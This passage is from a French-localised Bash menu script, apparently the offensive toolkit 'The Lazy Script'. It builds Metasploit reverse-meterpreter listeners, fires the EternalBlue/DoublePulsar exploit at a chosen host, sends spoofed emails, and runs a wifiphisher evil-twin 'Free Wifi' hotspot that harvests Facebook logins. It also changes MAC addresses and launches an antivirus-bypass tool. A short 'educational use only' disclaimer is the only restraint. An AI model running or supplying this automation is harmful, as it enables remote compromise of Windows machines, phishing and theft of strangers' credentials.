			echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
			echo "set PAYLOAD $PAYLOADL " >> "$LPATH"/rc/"$NAMEL".rc
			echo "set LHOST $ATIP " >> "$LPATH"/rc/"$NAMEL".rc
			echo "set LPORT $ATPORT " >> "$LPATH"/rc/"$NAMEL".rc
			echo "set ExitOnSession false" >> "$LPATH"/rc/"$NAMEL".rc
			echo "exploit -j" >> "$LPATH"/rc/"$NAMEL".rc
			clear
			echo -e "Lancer l'écouteur maintenant? "$YNONLY""
			read LLN
			if [[ "$LLN" = "y" ]]
			then
				echo -e "Lancement de msfconsole..."
				sleep 2
				clear
				msfconsole -r "$LPATH"/rc/"$NAMEL".rc
			fi
		fi
	elif [[ "$METASP" = "z" ]]
	then
		clear
		echo -e "ATTENTION: NE PAS l'upload sur des scanners antivirus en ligne."
		sleep 3
		echo -e "Vous êtes d'accord?("$YS"YES"$CE"/"$YS"*"$CE")"
		read MUSTBEYES
		if [[ "$MUSTBEYES" = "YES" ]] 
		then 
			clear
			cd /root/zirikatu
			./zirikatu.sh
		fi
	elif [[ "$METASP" = "2" ]]
	then
		clear
		echo -e "LHOST: "
		read LHOSTL
		echo -e "LPORT: "
		read LPORTL
		echo -e "PAYLOAD (Défaut: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
		read PAYLOADL
		if [[ -z "$PAYLOADL" ]]
		then
			echo -e "Réglage du PAYLOAD sur windows/meterpreter/reverse_tcp"
			sleep 2
			PAYLOADL="windows/meterpreter/reverse_tcp"
		fi
		echo -e "Nom de l'écouteur(e.g: "$YS"john"$CE") : "
		read NAMEL
		echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
		echo "set PAYLOAD $PAYLOADL " >> "$LPATH"/rc/"$NAMEL".rc
		echo "set LHOST $LHOSTL " >> "$LPATH"/rc/"$NAMEL".rc
		echo "set LPORT $LPORTL " >> "$LPATH"/rc/"$NAMEL".rc
		echo "set ExitOnSession false" >> "$LPATH"/rc/"$NAMEL".rc
		echo "exploit -j" >> "$LPATH"/rc/"$NAMEL".rc
		clear
		echo -e "Lancer l'écouteur maintenant? "$YNONLY""
		read LLN
		if [[ "$LLN" = "y" ]]
		then
			echo -e "Lancement de msfconsole..."
			sleep 2
			clear
			msfconsole -r "$LPATH"/rc/"$NAMEL".rc
		fi
	elif [[ "$METASP" = "3" ]]
	then
		while true
		do
		clear
		ls -w 1 "$LPATH"/rc
		echo -e ""
		echo -e ""
		echo -e "Entrer le nom de l'écouteur que vous voulez sélectionner(e.g: "$YS"john"$CE")"
		echo -e ""$YS" r"$CE") Supprimer tous les écouteurs enregistrés"
		echo -e ""$YS" b"$CE") Retour"
		read NAMERC
		clear
		if [[ "$NAMERC" = "back" || "$NAMERC" = "b" ]]
		then
			break
		elif [[ "$NAMERC" = "reset" || "$NAMERC" = "r" ]]
		then
			rm -f "$LPATH"/rc/*
			continue
		fi
		if [[ ! -f "$LPATH"/rc/"$NAMERC" ]]
		then
			NAMERC="$NAMERC".rc
			if [[ ! -f "$LPATH"/rc/"$NAMERC" ]]
			then
				echo -e "Aucun fichier trouvé. Essayez encore.."
				sleep 2
				continue
			fi
		fi
		while true
		do
		clear
		echo -e ""$NAMERC" sélectionné."
		echo -e ""$YS" 1"$CE") Start l'écouteur"
		echo -e ""$YS" 2"$CE") Supprimer l'écouteur"
		echo -e ""$YS" b"$CE") Retour"
		echo -e "Choix: "
		read LISTL
		if [[ "$LISTL" = "1" ]]
		then
			msfconsole -r "$LPATH"/rc/"$NAMERC"
		elif [[ "$LISTL" = "2" ]]
		then
			rm "$LPATH"/rc/"$NAMERC"
			break
		elif [[ "$LISTL" = "back" || "$LISTL" = "b" ]]
		then
			break
		fi
		done
		done
	elif [[ "$METASP" = "4" ]]
	then
		msfconsole
	elif [[ "$METASP" = "5" ]]
	then
		msfupdate
	elif [[ "$METASP" = "6" ]]
	then
		service postgresql start
		armitage
		clear
	elif [[ "$METASP" = "7" ]]
	then
		findsploit_menu
	elif [[ "$METASP" = "back" || "$METASP" = "b" ]]
	then
		BACKL="1"
		break
	elif [[ "$METASP" = "00" ]]
	then
		exec bash "$0"
	elif [[ "$METASP" = "0" ]]
	then
		clear
		exit
	fi
	done
}
function update_lscript
{
	echo -e "Vérification des mises à jour..."
	TESTINTERNETCONNECTION=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
	if [[ "$TESTINTERNETCONNECTION" != "" ]]
	then
		VER=$(timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/arismelachroinos/lscript/master/version.txt" 2>/dev/null)
		if [[ "$VERSION" != "$VER" ]]
		then
			clear
			echo -e "Une mise à jour est disponible."
			echo -e "Version actuelle: $VERSION"
			echo -e "Version mise à jour: $VER"
			echo -e "$PAKTC"
			$READAK
			clear
			echo -e "Voulez-vous mettre à jour?"$YNONLY": "
			read UPDATEYN
			if [[ "$UPDATEYN" = "y" ]]
			then
				clear
				#~ echo -e "Création d'un nouveau répertoire pour l'ancien lscript (il deviendra /root/lscriptold)"
				sleep 1
				if [[ -d /root/lscriptold ]]
				then
					rm -r /root/lscriptold
				fi
				mkdir /root/lscriptold
				echo -e ""
				#~ echo -e "Placement de lscript dans lscriptold"
				sleep 1
				mv "$LPATH" /root/lscriptold
				#~ echo -e "Clonage de la dernière version de github vers une nouvelle "$LPATH""
				sleep 1
				cd
				git clone https://github.com/arismelachroinos/lscript.git
				cd "$LPATH"
				chmod +x install.sh
				clear
				sleep 1
				if [[ -f /root/lscriptold/lscript/IAGREE.txt ]]
				then
					cp /root/lscriptold/lscript/IAGREE.txt "$LPATH"
				fi
				if [[ -d /root/lscriptold/lscript/ks ]]
				then
					echo -e "Copie de vos raccourcis"
					cp -r /root/lscriptold/lscript/ks "$LPATH"
					echo -e "Fait."
					sleep 0.2
				fi
				if [[ -d /root/lscriptold/lscript/settings ]]
				then
					echo -e "Copie de vos réglages"
					cp -r /root/lscriptold/lscript/settings "$LPATH"
					echo -e "Fait."
					sleep 0.2
				fi
				if [[ -f /root/lscriptold/lscript/wlanmon.txt ]]
				then
					echo -e "Copie de vos interfaces"
					cp /root/lscriptold/lscript/wlanmon.txt "$LPATH"
					echo -e "Fait."
					sleep 0.2
				fi
				echo -e ""
				if [[ -f /root/lscriptold/lscript/wlan.txt ]]
				then
					cp /root/lscriptold/lscript/wlan.txt "$LPATH"
					echo -e "Fait."
					sleep 0.2
					clear
				fi
				echo -e "$PAKTC"
				$READAK
				cd "$LPATH"
				gnome-terminal -e ./install.sh
				clear 
				sleep 1
				rm -rf /root/lscriptold
				echo -e "Fin..."
				sleep 1
				kill -9 $PPID
			else 
				clear
				echo -e "Vous n'avez pas sélectionné "y" donc vous revenez en arrière..."
				sleep 3
				exec bash "$0"
			fi
		else
			echo -e "Aucune mise à jour disponible"
			sleep 1
			echo -e "Version installée: $VERSION"
			sleep 1
			echo -e "Version de Github: $VER"
			sleep 1
			echo -e "$PAKTGB"
			$READAK	
			exec bash "$0"
		fi
	else
		clear
		echo -e "Il n'y a pas de connexion."
		sleep 1
		echo -e "Essayez de tapez 'stop' dans le menu principal pour accéder à nouveau à internet"
		echo -e ""
		echo -e "$PAKTGB"
		$READAK
		exec bash "$0"
	fi	
}
function hidden_shortcuts
{
	clear
	TERMINALTITLE="RACCOURCIS CACHES"
	dash_calc
	printf '\033]2;RACCOURCIS CACHES\a'
	echo -e ""$YS"  interface"$CE") Changer votre interface"
	echo -e ""$YS"     wififb"$CE") Créer un PA Wifi ouvert et obtenez des MdP Fb avec wifiphisher"
	echo -e ""$YS"eternalblue"$CE") Lancer msfconsole avec Eternalblue Exploit sur la cible"
	echo -e ""$YS"  etercheck"$CE") Vérifier sir une cible est vulnérable pour Eternalblue Exploit"
	echo -e ""$YS"  changelog"$CE") Voir le changelog des versions de lscript"
	echo -e ""$YS"     pstart"$CE") Service postgresql start"
	echo -e ""$YS"      pstop"$CE") Service postgresql stop"
	echo -e ""$YS"     nstart"$CE") Service network-manager start"
	echo -e ""$YS"      nstop"$CE") Service network-manager stop"
	echo -e ""$YS"     astart"$CE") Service apache2 start"
	echo -e ""$YS"      astop"$CE") Service apache2 stop"
	echo -e ""$YS"nessusstart"$CE") Start Nessus"
	echo -e ""$YS" nessusstop"$CE") Stop Nessus"
	echo -e "$PAKTGB"
	$READAK
	clear
}
function one_time_per_launch_ks
{
	if [[ -d ""$KSPATH"/nums" ]]
	then
		rm -r "$KSPATH"/nums
	fi
	mkdir "$KSPATH"/nums
	nn=1
	ff=1
	HOWMANY=0
	HOWADD=$(( HOWMANYTOOLS + 1 )) 
	while [[ "$nn" != "$HOWADD" ]]
	do
		listshortcuts
		if [[ -f ""$KSPATH"/"$TITLE"/"$TITLE"ks.txt" ]]
		then
				echo -e "$TITLE" > "$KSPATH"/nums/"$ff".txt
				ff=$(( ff+1 ))
				HOWMANY=$(( HOWMANY+1 ))		
		fi
		nn=$(( nn+1 ))

	done
	ONETIMEPERLAUNCH="1"
}
function interface_menu
{
	WLANN=$(cat "$LPATH"/wlan.txt)
	WLANNM=$(cat "$LPATH"/wlanmon.txt)
	echo -e "Les noms actuels de vos interfaces sans fil sont $WLANN et $WLANNM"
	sleep 2
	echo -e "Voulez-vous changer vos noms d'interface?"$YNYES": "
	read INAG
	if [[ "$INAG" = "n" ]]
	then
		clear
		echo -e "Alors pourquoi êtes-vous venu ici? lol"
		sleep 3
		exec bash "$0"
	else
		clear
		rm "$LPATH"/wlan.txt
		rm "$LPATH"/wlanmon.txt
		set_interface_number
	fi
}
function tools_menu
{
	while true
	do
	clear
	TERMINALTITLE="OUTILS"
	dash_calc
	printf '\033]2;OUTILS\a'
	echo -e ""$YS" 1"$CE") Outils Wifi"
	echo -e ""$YS" 2"$CE") Accès à distance"
	echo -e ""$YS" 3"$CE") Collecte d'informations"
	echo -e ""$YS" 4"$CE") Outils de SiteWeb"
	echo -e ""$YS" 5"$CE") Autres"
	echo -e ""$YS" 6"$CE") Installer/réinstaller un outil"
	echo -e ""$YS" i"$CE") Info"
	echo -e ""$YS" b"$CE") Retour"
	#~ echo -e ""$YS"00"$CE") Main menu"
	echo -e ""$YS" 0"$CE") QUITTER"
	echo "Choix: "
	read -e CATEG
	clear
		if [[ "$CATEG" = "1" ]]
		then
			wifi_tools
		elif [[ "$CATEG" = "2" ]]
		then
			remote_access
		elif [[ "$CATEG" = "3" ]]
		then
			information_gathering
		elif [[ "$CATEG" = "4" ]]
		then
			website_tools
		elif [[ "$CATEG" = "5" ]]
		then
			other_tools
		elif [[ "$CATEG" = "6" ]]
		then
			NOCONFIRM=0
			reinstall_tools
			NOCONFIRM=0
		elif [[ "$CATEG" = "0" ]]
		then
			clear
			exit
		elif [[ "$CATEG" = "back" || "$CATEG" = "b" || "$CATEG" = 00 ]]
		then
			BACKL="1"
			break
		elif [[ "$CATEG" = "i" ]]
		then
			TERMINALTITLE="INFO"
			dash_calc
			printf '\033]2;INFO\a'
			echo -e ""$LGYS"Outils Wifi:"
			echo -e "	Principalement les attaques de réseau, MITM, DoS, evil-twin et phishin."
			echo -e "Accès à distance:"
			echo -e "	Principalement la génération de Payload, écouteurs, exploits, scanners"
			echo -e "	et le bypass des logiciels anti-virus."
			echo -e "Collecte d'informations:"
			echo -e "	Assez explicite."
			echo -e "Autres outils:"
			echo -e "	Quelques outils très utiles qui ne correspondent pas aux autres catégories."
			echo -e "Installer/réinstaller un outil:"
			echo -e "	De là, vous pouvez installer les outils disponibles dans The Lazy Script."
			echo -e "	S'il est déjà installé, il sera supprimé et réinstallé."$CE""
			echo -e ""
			echo -e ""$BS"Voulez-vous qu'un autre outil soit ajouté dans le script?"$CE""
			echo -e ""$BS"Soumettez-le comme une issue sur mon dépôt github:"$CE""
			echo -e "	"$YS"https://github.com/arismelachroinos/lscript"$CE""
			echo -e ""
			echo -e ""
			echo -e "$PAKTGB"
			$READAK
		fi
	done
}
function public_ip
{
	clear
	echo -e ""$BS"Merci de patienter..."$CE""
	CHECKMON=$(ifconfig | grep "mon")
	if [[ "$CHECKMON" = "" ]]
	then
		clear
		PUBLICIP=$(curl -s ipinfo.io/ip)
		if [[ "$PUBLICIP" = "" ]]
		then
			PUBLICIP=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
			if [[ "$PUBLICIP" = "" ]]
			then
				clear
				PUBLICIP="Erreur de connexion."
			fi
		fi
		echo "Votre IP publique est: "$PUBLICIP""
		#~ curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
	else
		echo -e "Lorsque le mode moniteur est activé, vous n'avez pas accès à Internet."
		echo -e "Sélectionnez 'd2' pour désactiver le mode moniteur"
		echo -e "$PAKTGB"
		$READAK
		clear
		exec bash "$0"
	fi
}
function terms_of_use
{
	printf '\033]2;CONDITIONS D UTILISATION\a'
	clear
	echo -e ""$RS"Vous devez accepter les conditions."$CE""
	sleep 1
	echo -e "$PAKTC"
	$READAK
	clear
	echo -e "Cet outil est uniquement à des fins éducatives."
	echo -e "Utilisez cet outil uniquement sur votre propre réseau et jamais sans autorisation."
	echo -e "Je ne suis pas responsable de tout ce que vous faites avec cet outil."
	echo -e "Allez-vous utiliser cet outil uniquement sur votre réseau et sous votre propre responsabilité?("$YS"YES"$CE"/"$YS"NO"$CE"): "
	read YESORNO
	if [[ "$YESORNO" = "YES" ]]
	then 
		echo "Vous avez accepté les conditions et vous utilisez cet outil sous votre propre responsabilité." > "$LPATH"/IAGREE.txt
		sleep 1
		clear
	else
		echo -e "Vous n'avez pas tapé 'YES' , donc vous ne pouvez pas continuer"
		sleep 4
	fi
	exec bash "$0"
}
function eternalblue
{
	if [[ ! -d "$LPATH"/rce ]]
	then
		mkdir	"$LPATH"/rce
	fi
	EG=$(local_ips $WLANN)
	if [[ "$EG" != "" ]]
	then
		echo -e "LHOST: ("$YS""Enter""$CE"="$EG") "
	else
		echo -e "LHOST: "
	fi
	read LHOSTL
	if [[ "$EG" != "" && "$LHOSTL" = "" ]]
	then
		LHOSTL="$EG"
	fi
	echo -e "RHOST: "
	read RHOSTL
	echo -e "TARGETARCHITECTURE("$YS"x86"$CE"/"$YS"x64"$CE"): "
	read TARGETARCHL
	if [[ "$TARGETARCHL" = "x64" ]]
	then
		PROCESSINJECTL="lsass.exe"
		PAYLOADL="windows/x64/meterpreter/reverse_tcp"
	else
		PAYLOADL="windows/meterpreter/reverse_tcp"
	fi
	echo -e "TARGET("$YS"0"$CE"-"$YS"8"$CE"): "
	read TARGETL
	echo "use exploit/windows/smb/eternalblue_doublepulsar" > "$LPATH"/rce/eternalbluerc.rc
	echo "set LHOST "$LHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set RHOST "$RHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set PAYLOAD "$PAYLOADL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set TARGET "$TARGETL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set TARGETARCHITECTURE "$TARGETARCHL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set PROCESSINJECT "$PROCESSINJECTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "show info" >> "$LPATH"/rce/eternalbluerc.rc
	echo "exploit -j" >> "$LPATH"/rce/eternalbluerc.rc
	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
	
}
function eternalblue_check
{
	if [[ ! -d "$LPATH"/rce ]]
	then
		mkdir	"$LPATH"/rce
	fi
	echo -e "RHOST:("$BS"si vous scannez plusieurs hôtes, séparez les par un espace"$CE") "
	read RHOSTL
	echo "use auxiliary/scanner/smb/smb_ms17_010" > "$LPATH"/rce/eternalbluerc.rc
	echo "set RHOSTS "$RHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "exploit" >> "$LPATH"/rce/eternalbluerc.rc
	echo -e ""$BS"Lancement de msfconsole. Merci de patienter..."$CE""
	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
	
}
function start_menu
{
	O1=0
	O2=0
	O3=0
	echo -e "Activation de $WLANNM..."
	enable_wlan
	echo -e "Killing services..."
	airmon-ng check kill &> /dev/null && echo -e ""$YS"Fait"$CE"" && O1=1
	echo -e "Lancement du mode moniteur..."
	if [[ "$ALFA" = "yes" ]]
	then
		ifconfig $WLANN down
		iwconfig $WLANN mode monitor &> /dev/null && echo -e ""$YS"Fait"$CE"" && O2=1
		ifconfig $WLANN up
	else
		airmon-ng start $WLANN | grep "monitor mode" | awk -F "(" {'print $2'} | cut -d ')' -f1 &> /dev/null && echo -e ""$YS"Fait"$CE"" && O2=1
	fi
	if [[ -f "$LPATH"/settings/startmac.txt ]]
	then
		read STARTMAC < "$LPATH"/settings/startmac.txt
	else
		STARTMAC="$DEFMAC"
	fi
	echo -e "Changement de l'adresse MAC de $WLANNM par "$STARTMAC"..."
	ifconfig $WLANNM down
	macchanger -m $STARTMAC $WLANNM &> /dev/null | grep "New MAC:" &> /dev/null && O3=1
	ifconfig $WLANNM up && echo -e ""$YS"Fait"$CE"" 
	if [[ "$O1" = 1 && "$O2" = 1 && "$O3" = 1 && "$O4" = 1 ]]
	then
		BACKL=1
	fi
}
function stop_menu
{
	O1=0
	O2=0
	O3=0
	stop_monitor
	echo -e "Changement de l'adresse MAC de $WLANN par celle d'origine..."
	ifconfig $WLANN down
	macchanger -p $WLANN | grep "Current MAC:" && O1=1
	ifconfig $WLANN up
	echo -e ""$YS"Fait"$CE""
	if [[ "$O1" = 1 && "$O2" = 1 && "$O3" = 1 ]]
	then
		BACKL=1
	fi
}
function stop_monitor
{
	echo -e "Désactivation de $WLANNM..."
	echo -e "Arrêt du mode moniteur..."
	if [[ "$ALFA" = "yes" ]]
	then
		A1=0
		A2=0
		A3=0
		ifconfig $WLANN down && A1=1
		iwconfig $WLANN mode managed && A2=1
		ifconfig $WLANN up && A3=1
		if [[ "$A1" = 1 && "$A2" = 1 && "$A3" = 1 ]]
		then
			echo -e ""$YS"Fait"$CE"" && O2=1
		else
			echo -e ""$RS"Erreur de l'arrêt du mode moniteur."$CE""
		fi
	else
		airmon-ng stop $WLANNM &>/dev/null && echo -e ""$YS"Fait"$CE"" && O2=1 || echo -e ""$RS"Erreur de l'arrêt du mode moniteur."$CE""
	fi
	echo -e "Démarrage du service network-manager..."
	service network-manager start && echo -e ""$YS"Fait"$CE"" && O3=1 || echo -e ""$RS"Erreur du démarrage du service network-manager"$CE""
}
function spoof_email
{
while true
do
	sm=0
	clear
	if [[ ! -d /bin/lscript/smtp ]]
	then
		mkdir /bin/lscript/smtp
	fi
	echo -e ""$RS"VOUS DEVEZ D'ABORD VOUS INSCRIRE SUR https://www.smtp2go.com ET VÉRIFIER VOTRE EMAIL."$CE""
	echo -e ""$RS"ENSUITE ALLEZ SUR https://app.smtp2go.com/settings/users ET CRÉEZ UN NOM D'UTILISATEUR ET UN MDP."$CE""
	echo -e ""$RS"      #########TOUJOURS AVOIR LA PERMISSION DES EMAILS QUE VOUS USURPÉ##########"$CE""
	echo -e ""$RS"      ########N'ENVOYEZ PAS DE VIRUS, DE PHISHING OU DE CHOSES ILLÉGALES########"$CE""
	if [[ ! -f /bin/lscript/smtp/smtpemail.txt ]]
	then
		echo -e ""$YS" 1"$CE") Configurez votre nom d'utilisateur et votre passe SMTP     "$RS"PAS CONFIGURÉ"$CE""
	else
		read smtpemail < /bin/lscript/smtp/smtpemail.txt
		echo -e ""$YS" 1"$CE") Configurez votre nom d'utilisateur et votre passe SMTP     Actuel: "$YS""$smtpemail""$CE""
	fi
	echo -e ""$YS" 2"$CE") Envoyer un e-mail usurpé"
	echo -e ""$YS" 3"$CE") Effacez votre nom d'utilisateur SMTP et MdP de lscript"
	echo -e ""$YS" 4"$CE") Réparer les emails echoués"
	echo -e ""$YS" b"$CE") Retour"
	echo -e ""$YS" 0"$CE") QUITTER"
	read SMTP
	if [[ "$SMTP" = "1" ]]
	then
		clear
		echo -e "Entrez votre nom d'utilisateur smtp(Il est ici: https://app.smtp2go.com/settings/users ): "
		read SMTPEMAIL
		echo -e "Entrez votre mot de passe smtp(Il est ici: https://app.smtp2go.com/settings/users ): "
		read SMTPPASS
		clear
		echo "$SMTPEMAIL" > /bin/lscript/smtp/smtpemail.txt
		echo "$SMTPPASS" > /bin/lscript/smtp/smtppass.txt 
		echo -e "Informations d'identification enregistrées sur /bin/lscript/smtp"
		sleep 3
	elif [[ "$SMTP" = "4" ]]
	then
		clear	
		echo -e "Si votre e-mail échoue, la raison en est que sur l'option 1, vous n'avez pas défini le nom d'utilisateur et le mot de passe corrects. Trouvez-les sur https://app.smtp2go.com/settings/users."
		sleep 2
		echo -e "$PAKTGB"
		read -e -n 1 -r
	elif [[ "$SMTP" = "3" ]]
	then
		if [[ -f /bin/lscript/smtp/smtpemail.txt ]]
		then
			rm /bin/lscript/smtp/smtpemail.txt
			echo -e "Nom d'utilisateur supprimé"
		else
			echo -e "Nom d'utilisateur introuvable"
		fi
		if [[ -f /bin/lscript/smtp/smtppass.txt ]]
		then
			rm /bin/lscript/smtp/smtppass.txt
			echo -e "Mot de passe supprimé"
		else
			echo -e "Pas de mot de passe trouvé"
		fi
		sleep 2
		continue
	elif [[ "$SMTP" = "0" ]]
	then
		clear
		exit
	elif [[ "$SMTP" = "back" || "$SMTP" = "b" ]]
	then
		clear
		break
	elif [[ "$SMTP" = "2" ]]
	then
		while true
		do
		clear
		if [[ ! -f /bin/lscript/smtp/smtpemail.txt ]]
		then
			echo -e "Aucun nom d'utilisateur smtp trouvé."
			sm=1
		fi
		if [[ ! -f /bin/lscript/smtp/smtppass.txt ]]
		then
			echo -e "Aucune MdP smtp trouvée."
			sm=1
		fi
		if [[ "$sm" = 1 ]]
		then
			break
		fi
		read smtppass < /bin/lscript/smtp/smtppass.txt
		read smtpemail < /bin/lscript/smtp/smtpemail.txt
		clear
		echo -e "Votre nom d'utilisateur est "$RS""$smtpemail""$CE""
		echo -e ""
		echo -e "Entrez l'email de la cible: "
		read TARGETSEMAIL
		echo -e "Entrez l'email que vous souhaitez que la cible voit: "
		read SPOOFEDEMAIL
		echo -e "Entrez l'objet du message: "
		read SUBJECTEMAIL
		echo -e "Entrez le message: "
		read MESSAGEEMAIL
		echo -e "Entrez le serveur smtp ("$YS"Entrer"$CE"=mail.smtp2go.com): "
		read SMTPSERVER
		if [[ "$SMTPSERVER" = "" ]]
		then
			SMTPSERVER="mail.smtp2go.com"
		fi
		echo -e "Entrer le port smtp ("$YS"Entrer"$CE"=2525): "
		read SMTPPORT
		if [[ "$SMTPPORT" = "" ]]
		then
			SMTPPORT="2525"
		fi
		echo -e "Appuyez sur "$YS"entrer"$CE" pour envoyer le message à "$TARGETSEMAIL""
		read 
		clear
		sendemail -f $SPOOFEDEMAIL -t $TARGETSEMAIL -u $SUBJECTEMAIL -m $MESSAGEEMAIL -s "$SMTPSERVER":"$SMTPPORT" -xu "$smtpemail" -xp "$smtppass"
		echo -e "$PAKTGB"
		read -e -n 1 -r
		break
		done
	fi
done
}
function new_terminal
{
	while true
	do
	clear
	if [[ "$ALFA" = "yes" ]]
	then
		CHECKMON=$(iwconfig "$WLANN" | grep "Mode:Monitor")
	else
		CHECKMON=$(ifconfig | grep "$WLANNM")
	fi
	clear
	if [[ "$CHECKMON" = "" ]]
	then
		echo -e "Le mode moniteur n'est pas activé."
		echo -e ""
		echo -e "Voulez-vous activer le mode moniteur? "$YNYES": "
		read MONITOREN
		clear
		if [[ "$MONITOREN" = "n" ]]
		then
		#~ echo -e "Sélectionnez 'start' ou '2' pour l'activer"
			echo -e "$PAKTGB"
			$READAK
			clear
			exec bash "$0"
		else
			CHECKWL=$(ifconfig | grep "$WLANN")
			if [[ "$CHECKWL" == "" ]]
			then
				echo -e ""$RS""$WLANN" n'a pas été trouvé"$CE""
				sleep 2
				BACKL=1
				break
			fi
			start_menu
			continue
		fi
	else
		if [[ "$YORNAA" = "10" ]]
		then
			echo -e "Déplacement dans un nouveau terminal..."
			sleep 1
			FJC=0
			export FJC
			gnome-terminal --geometry 87x35+9999+0 -- lh1
			sleep 1
			exec bash "$0"
			break
		elif [[ "$YORNAA" = "11" ]]
		then
			clear
			echo -e "Déplacement dans un nouveau terminal..."
			sleep 1
			gnome-terminal --geometry 80x25+9999+0 -- lh3
			sleep 1
			exec bash "$0"
			break
		elif [[ "$YORNAA" = "12" ]]
		then
			echo -e "Déplacement dans un nouveau terminal..."
			sleep 1
			gnome-terminal --geometry 80x25+9999+0 -- lh4
			sleep 1
			exec bash "$0"
			break
		fi
	fi
	done
}
function check_if_ks
{
	while [ $var1 -le $HOWMANY ]
	do
		if [[ -f "$KSPATH"/nums/"$var1".txt ]]
		then
			read TITLE < "$KSPATH"/nums/"$var1".txt
			read YORNAKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
			if [[ "$YORNAA" = "$YORNAKS" ]]
			then
				read COMMAND1 < ""$KSPATH"/"$TITLE"/"$TITLE".txt"
				read COMMAND2 < ""$KSPATH"/"$TITLE"/"$TITLE"2.txt"
				$COMMAND1
				#~ if [[ -f ""$KSPATH"/"$TITLE"/"$TITLE"3.txt" ]]
				#~ then
					#~ read $COMMAND3 < ""$KSPATH"/"$TITLE"/"$TITLE"3.txt"
					#~ $COMMAND3
				#~ fi
				$COMMAND2
				BACKL="1"
			fi
		fi
		var1=$(( var1+1 ))
	done
}
function wififb_attack
{
	
	while true
	do
		clear
		TERMINALTITLE="WIFIFB-MENU"
		dash_calc
		printf '\033]2;WIFIFB-MENU\a'	
		echo -e ""$YS" 1"$CE") Démarrer l'attaque ("$BS"toujours arrêter l'attaque avec ESC"$CE")"
		echo -e ""$YS" 2"$CE") Check & save les nouveaux MdP ("$BS"faites-le à la fin de l'attaque"$CE")"
		echo -e ""$YS" 3"$CE") Afficher tous les MdP enregistrés"
		echo -e ""$YS" 4"$CE") Copiez le fichier de tous les MdP save sur le bureau"
		echo -e ""$YS" 5"$CE") Supprimer le fichier de tous les MdP enregistrés"
		echo -e ""$YS" 6"$CE") Correction du problème pas de wifi après l'attaque"
		echo -e ""$YS" b"$CE") Retour"
		echo -e "Choix	:"
		read wifimenu
		clear
		if [[ "$wifimenu" == 1 ]]
		then
			wififb
		elif [[ "$wifimenu" == 2 ]]
		then
			wififb_pass
			echo -e "$PAKTGB"
			$READAK
		elif [[ "$wifimenu" == 3 ]]
		then
			if [[ -f $wififbpassfileall ]]
			then
				cat $wififbpassfileall
			else
				echo -e ""$RS"Fichier non trouvé. Obtenez d'abord quelques mots de passe."$CE""
			fi
			echo -e "$PAKTGB"
			$READAK
		elif [[ "$wifimenu" == 4 ]]
		then
			cp $wififbpassfileall /root/Desktop/all-saved-passwords.txt && echo -e "Fait"
		elif [[ "$wifimenu" == 5 ]]
		then
			rm $wififbpassfileall && echo -e "Fait"
		elif [[ "$wifimenu" == 6 ]]
		then
			nmcli n on
			echo -e "Erreur corrigée, vous devrez peut-être redémarrer votre système"
			echo -e "$PAKTGB"
			$READAK
		elif [[ "$wifimenu" == 'b' || "$wifimenu" == "back" || "$wifimenu" == 00 ]]
		then
			exec bash $0
		fi
	done
}
function wififb
{
	echo -e "Nom du point d'accès: "
	echo -e " "$YS"1"$CE") Free Wifi"
	echo -e " "$YS"2"$CE") FREE WIFI"
	echo -e " "$YS"3"$CE") Wifi Hotspot"
	echo -e " "$YS"4"$CE") WIFI HOTSPOT"
	echo -e " "$YS"5"$CE") Hotspot"
	echo -e " "$YS"6"$CE") Android Hotspot"
	echo -e " "$YS"7"$CE") Cafe Wifi"
	echo -e " "$YS"8"$CE") Public Wifi"
	echo -e " "$YS"9"$CE") PUBLIC WIFI"
	echo -e ""$YS"10"$CE") Free Public Wifi"
	echo -e ""$YS"11"$CE") FREE PUBLIC WIFI"
	echo -e " "$YS"c"$CE") Nom personnalisé"
	echo -e " "$YS"b"$CE") Retour"
	read wifiind
	if [[ "$wifiind" == 1 ]]
	then
		wifiname="Free Wifi"
	elif [[ "$wifiind" == 2 ]]
	then
		wifiname="FREE WIFI"
	
	elif [[ "$wifiind" == 3 ]]
	then
		wifiname="Wifi Hotspot"
	
	elif [[ "$wifiind" == 4 ]]
	then
		wifiname="WIFI HOTSPOT"
	
	elif [[ "$wifiind" == 5 ]]
	then
		wifiname="Hotspot"
	
	elif [[ "$wifiind" == 6 ]]
	then
		wifiname="Android Hotspot"
	
	elif [[ "$wifiind" == 7 ]]
	then
		wifiname="Cafe Wifi"
	
	elif [[ "$wifiind" == 8 ]]
	then
		wifiname="Public Wifi"
	
	elif [[ "$wifiind" == 9 ]]
	then
		wifiname="PUBLIC WIFI"
	
	elif [[ "$wifiind" == 10 ]]
	then
		wifiname="Free Public Wifi"
	
	elif [[ "$wifiind" == 11 ]]
	then
		wifiname="FREE PUBLIC WIFI"
	
	elif [[ "$wifiind" == 'c' ]]
	then
		clear
		echo -e "Nom du point d'accès personnalisé:"
		read wifiname
	elif [[ "$wifiind" == 'b' || "$wifiind" == 'back' ]]
	then
		wififb_attack
	fi
	ESSIDAP=$wifiname
	export ESSIDAP
	export wififbfile
	xterm -hold -geometry 160x60+9999+999999 -e bash -c 'printf "\033]2;WIFI FB TRAP\a" && wifiphisher --noextensions --essid "$ESSIDAP" -p oauth-login -kB --logging | tee $wififbfile; exec bash' & disown 
}
function wififb_pass
{
	if [[ -f $wififbfile ]]
	then
		##trouver combien de lignes
		lines=$(cat $wififbfile | awk 'END{print NR}')
		n=1
		z=0
		while [[ "$n" -le "$lines" ]]
		do
			USERNAME=""
			PASS=""
